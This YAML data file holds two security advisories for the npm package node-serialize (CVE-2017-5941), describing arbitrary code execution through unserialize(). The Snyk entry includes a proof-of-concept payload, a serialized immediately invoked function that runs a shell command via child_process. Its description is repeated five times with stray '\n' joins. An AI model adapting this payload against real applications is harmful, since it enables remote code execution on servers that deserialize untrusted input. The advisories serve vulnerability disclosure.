---
- id: nodesecurity:npm:node-serialize:2017-02-09
  title: Code Execution through IIFE
  description: Affected versions of `node-serialize` can be abused to execute arbitrary
    code via an [immediately invoked function expression](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression)
    (IIFE) if untrusted user input is passed into `unserialize()`.
  affected_package: node-serialize
  vulnerable_versions:
  - "<=99.999.99999"
  patched_versions:
  - "<0.0.0"
  severity: high
  package_manager: npm
  cvss_v3_vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  credit:
  - Ajin Abraham
  references:
  - |-
    https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
    https://github.com/luin/serialize/issues/4)
  source_url: https://nodesecurity.io/advisories/311
- id: snykio:npm:node-serialize:2017-02-08
  title: Arbitrary Code Execution
  description: |
    [`node-serialize`][1] serializes an object and it\'s function into a
    JSON.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution when untrusted user-input is passed into the `unserialize()`
    function.

    **Example:**

        var serialize = require('node-serialize');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.unserialize(payload);



    [1]: https://www.npmjs.com/package/node-serialize
    \n[`node-serialize`][1] serializes an object and it\'s function into a
    JSON.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution when untrusted user-input is passed into the `unserialize()`
    function.

    **Example:**

        var serialize = require('node-serialize');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.unserialize(payload);



    [1]: https://www.npmjs.com/package/node-serialize
    \n[`node-serialize`][1] serializes an object and it\'s function into a
    JSON.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution when untrusted user-input is passed into the `unserialize()`
    function.

    **Example:**

        var serialize = require('node-serialize');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.unserialize(payload);



    [1]: https://www.npmjs.com/package/node-serialize
    \n[`node-serialize`][1] serializes an object and it\'s function into a
    JSON.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution when untrusted user-input is passed into the `unserialize()`
    function.

    **Example:**

        var serialize = require('node-serialize');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.unserialize(payload);



    [1]: https://www.npmjs.com/package/node-serialize
    \n[`node-serialize`][1] serializes an object and it\'s function into a
    JSON.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution when untrusted user-input is passed into the `unserialize()`
    function.

    **Example:**

        var serialize = require('node-serialize');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.unserialize(payload);



    [1]: https://www.npmjs.com/package/node-serialize
  affected_package: node-serialize
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2017-5941
  cwe:
  - CWE-502
  credit:
  - Ajin Abraham
  references:
  - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
  - https://github.com/luin/serialize/issues/4
  source_url: https://snyk.io/vuln/npm:node-serialize:20170208
